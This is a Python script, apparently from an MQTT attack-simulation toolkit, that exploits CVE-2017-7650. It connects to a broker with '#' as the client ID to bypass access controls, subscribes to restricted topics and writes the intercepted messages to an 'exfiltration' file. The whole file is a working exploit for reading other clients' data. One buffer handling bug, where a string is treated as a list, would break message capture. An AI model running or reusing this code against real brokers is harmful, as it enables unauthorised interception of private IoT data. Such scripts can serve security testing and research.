import argparse
import threading
from time import sleep
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time


def on_message(client, userdata, message):
    with userdata["lock"]:
        userdata["messages"].append(f"topic: {message.topic}  -  payload: {message.payload.decode()}\n")


def main(username, password, topics, file_name, duration=10):
    """In publisher exfiltration the attacker connects to the broker using '#' as client ID to exploit CVE-2017-7650 vulnerability and subscribe to normally inaccessible topics."""
    data_dict = {"messages": "", "lock": threading.Lock()}
    client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2, client_id="#", userdata=data_dict,
                         protocol=mqtt.MQTTv311)
    client.username_pw_set(username, password)
    client.on_message = on_message
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_subscribe = util.on_subscribe
    start_time = time.time()

    if util.connect_client_v3(client):
        print("Subscribing to input topics...", flush=True)
        for topic in topics:
            tries = 0
            while True:
                result = client.subscribe(topic, 2)
                if result[0] == mqtt.MQTT_ERR_SUCCESS:
                    print(f"Subscription request with mid - {result[1]} has been sent")
                    break
                else:
                    if tries >= 30:
                        print("No connection available, ending script...")
                        return
                    else:
                        print(f"Connection unavailable, retrying in 10 seconds...")
                        tries += 1
                        sleep(10)

        with open(file_name, "w") as f:
            f.write("Beginning to register data...\n")
    else:
        print(f"Broker not reachable, ending script...", flush=True)
        return

    elapsed_time = time.time() - start_time
    while elapsed_time < duration:
        with data_dict["lock"]:
            if data_dict["messages"]:
                with open(file_name, "a") as f:
                    f.write(data_dict["messages"])
                data_dict["messages"] = ""
            else:
                with open(file_name, "a") as f:
                    f.write("No message received")
        time.sleep(60)
        elapsed_time = time.time() - start_time
    else:
        client.disconnect()
        print("Time elapsed, script ending...", flush=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='launch an exfiltration from a client exploiting an existing user with \# or + as name')
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username")
    parser.add_argument("-p", "--password", type=str, help="password")
    parser.add_argument("-f", "--file-name", type=str, help="name for the file to gather exfiltrated data")
    parser.add_argument("-t", "--topics", type=str, nargs="*", help="topics to subscribe to")
    args = parser.parse_args()
    main(args.username, args.password, args.topics, args.file_name, args.duration)
